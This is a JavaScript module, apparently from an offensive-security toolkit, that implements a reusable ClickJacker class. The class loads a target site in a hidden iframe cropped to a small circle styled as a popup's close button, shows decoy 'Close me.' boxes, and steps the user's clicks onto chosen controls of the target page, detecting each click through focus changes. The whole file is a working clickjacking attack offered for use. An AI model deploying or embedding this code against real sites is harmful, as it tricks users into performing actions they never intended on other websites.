
import { createElement, randInt } from "./utils.js"


const css = `

.clickjacker * {
    margin: 0;
    padding: 0;
  }

  .clickjacker {
    --c-x: calc(var(--x) + var(--w) / 2);
    --c-y: calc(var(--y) + var(--h) / 2);
    --size: 25px;
    --bg-color: white;
    background: rgba(0, 0, 0, 0.5);
    position: fixed;
    top: 0;
    left: 0;
    height: 100vh;
    width: 100vw;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .clickjacker .inner {
    position: relative;
  }

  .clickjacker .fake-container {
    border: 2px solid black;
  }

  .clickjacker .inner .close {
    position: absolute;
    top: 0;
    right: 0;
    transform: translate(40%, -40%);
  }
  .clickjacker .inner > div:hover .frame-container::after {
    font-weight: bold;
  }
  .clickjacker .frame-container {
    box-sizing: border-box;
    position: relative;
    width: var(--size);
    height: var(--size);
    overflow: hidden;
    border-radius: 100%;
    border: 2px solid black;
  }
  .clickjacker:not(.debug) .frame-container::after {
    box-sizing: border-box;
    content: "×";
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    display: flex;
    justify-content: center;
    align-items: center;
    background: white;
    pointer-events: none;
    color: black;
  }

  .clickjacker .frame-container iframe {
    position: absolute;
    border: none;
    width: 100vw;
    height: 1000vh;
    top: calc(var(--c-y) * -1px + var(--size) / 2);
    left: calc(var(--c-x) * -1px + var(--size) / 2);
  }
`

function closeMe() {
    const width = randInt(400, 600)
    const height = randInt(400, 600)
    const randomColor = randInt(0, 0xfff)
    const bg = ("000" + randomColor.toString(16)).slice(-3)
    const el = createElement("div", {
        innerText: "Close me.",
        style: {
            width: `${width}px`,
            height: `${height}px`,
            background: `#${bg}`,
            color: "white",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            fontSize: "2em",
        }
    })
    return el
}


function createSkeleton(url, debug=false) {
    const frame = createElement("iframe", { src: url })
    const fakeContainer = createElement("div", { className: "fake-container" })
    const focusGetter = createElement("input", {
        style: {
            position: "fixed",
            top: "-1000px"
        }
    })
    const el = createElement("div", { className: `clickjacker${debug ? ' debug': ''}`}, [
        createElement("div", { className: "inner" }, [
            createElement("div", { className: "close" }, [
                createElement("div", { className: "frame-container" }, [
                    frame
                ])
            ]),
            fakeContainer,
            focusGetter
        ])
    ])

    const setFake = el => {
        fakeContainer.innerHTML = ""
        fakeContainer.appendChild(el)
    }
    const setPos = (box) => {
        el.style.setProperty("--x", box.x)
        el.style.setProperty("--y", box.y)
        el.style.setProperty("--w", box.width || 0)
        el.style.setProperty("--h", box.height || 0)
    }
    const setFocus = () => focusGetter.focus()
    return { el, frame, setFake, setPos, setFocus }
}

function waitForFocus(f) {
    return new Promise(resolve => {

        const blurListener = () => {
            setTimeout(async () => {
                if (document.activeElement == f) {
                    window.removeEventListener("blur", blurListener)
                    resolve()
                }
            }, 200);
        };

        window.addEventListener("blur", blurListener);
    })
}

/**
 * 
 * @typedef {Object} BoundingBox
 * @property {number} x - The X coordinate
 * @property {number} y - The Y coordinate
 * @property {number} [width=0] - The width of the box
 * @property {number} [height=0] - The height of the box
 */

/**
 * Tools box for clickjacking attacks
 * @class
 * @example
 * const cj = new ClickJacker(url)
 *       .addStep({ x: 8, y: 8, width: 93.53, height: 29 })
 *       .addStep({ x: 101.53, y: 8, height: 29, width: 93.53 })
 *       .addStep({ x: 195.06, y: 8, height: 29, width: 93.53 })
 * await cj.run()
 */
class ClickJacker {
    /**
     * 
     * @param {String} url Target url for clickjacking
     * @param {Boolean} [debug=false] Run in debug mode, the iframe is not hidden
     * @example
     * new ClickJacker("vulnerable.com").addStep({x: 10, y:22}).run()
     */
    constructor(url, debug=false) {
        this.debug = debug
        this.url = url
        this.steps = []
    }

    _init() {
        return new Promise(resolve => {
            const id = "ClickJackerCSS"
            if (document.getElementById(id))
                return resolve()
            const s = document.createElement("style")
            s.id = id
            s.innerText = css
            s.onload = () => resolve();
            (document.header || document.documentElement).appendChild(s)
        })
    }

    /**
     * Add a step in the current ClickJacker, the iframe will be centered according to the bounding box.
     * @param {BoundingBox} box Coordinate of the clickable element in the vulnerable page
     * @param {HTMLElement} [content=null] Html element to put in the popup, if null, render a "close me" popup 
     * @param {number} [wait=200]  Time to wait after a click has been detected
     * @returns {ClickJacker} Return itself
     */
    addStep(box, content = null, wait = 200) {
        this.steps.push({ box, content, wait })
        return this
    }

    /**
     * Start the ClickJacking process. 
     * @returns {Promise<ClickJacker>} Return itself
     */
    async run() {
        await this._init()
        const skel = createSkeleton(this.url, this.debug)
        document.body.appendChild(skel.el)
        skel.setFocus()
        for (const step of this.steps) {
            skel.setFake(step.content ? step.content : closeMe())
            skel.setPos(step.box)
            await waitForFocus(skel.frame)
            skel.setFocus()
        }
        skel.el.style.left = "1000vw"
        return this
    }

}

export default ClickJacker